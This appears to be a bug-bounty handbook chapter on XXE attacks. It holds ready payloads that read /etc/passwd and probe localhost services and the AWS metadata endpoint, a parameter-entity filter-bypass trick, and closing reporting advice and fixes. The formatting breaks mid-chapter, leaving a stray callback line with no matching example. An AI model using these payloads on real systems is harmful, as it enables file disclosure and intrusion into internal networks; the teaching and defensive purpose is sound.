# Chapter 15 – XML External Entity (XXE)

## Mental Model
Applications that parse XML may allow attackers to define entities that reference:
- Local files
- Internal URLs/IPs
- Cloud metadata endpoints

If the parser does not disable external entity resolution, XML payloads can leak files or pivot into internal networks.

---

## High-Value Targets
- XML upload interfaces (config importers, invoice processors)
- SAML / SSO integrations
- SOAP APIs
- Any POST/PUT request with `Content-Type: application/xml` or `text/xml`

---

## Recon Checklist
Look for:
- XML request bodies starting with:
  - `<?xml version="1.0"?>`
- Parameters that accept XML chunks
- Errors referencing:
  - “entity”
  - “external”
  - “DOCTYPE”
- SAML responses in web apps

---

## Basic XXE File Read (Echo XXE)
If the server returns XML response content, try:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
### If vulnerable → collaborator receives DNS/HTTP callback.
SSRF-Style XXE

Targets include internal services:

http://127.0.0.1:8080/admin

http://localhost:8080/metrics

AWS metadata:

http://169.254.169.254/latest/meta-data/

Example:

<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root>&xxe;</root>

Advanced Tricks
Parameter Entities

Useful for bypassing filters:

<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY xxe '%file;'>">
  %eval;
]>
<root>&xxe;</root>

Protocol Smuggling (depends on parser)

file://

http://

ftp://

gopher:// (rare but very powerful)

Automation Ideas

Prepare several XML templates:

Echo test

Blind OOB test

Internal URL probe

Metadata endpoint extraction

Small Python script to:

Send each template

Log response length

Detect anomalies automatically

Reporting Tips

When writing the bug report:

Include:

Vulnerable endpoint

Full raw XML payload

How you detected the vulnerability

Evidence:

Extracted file (sanitize sensitive content)

Collaborator hit

Internal service response

Impact:

Arbitrary file disclosure

Internal network exposure

Credential leak from config files

Potential RCE via chained attacks (rare but possible)

Recommended Fixes:

Disable external entity resolution in XML libraries

Use secure XML parser settings

Prefer JSON for user-supplied data

Validate the XML structure strictly against schemas
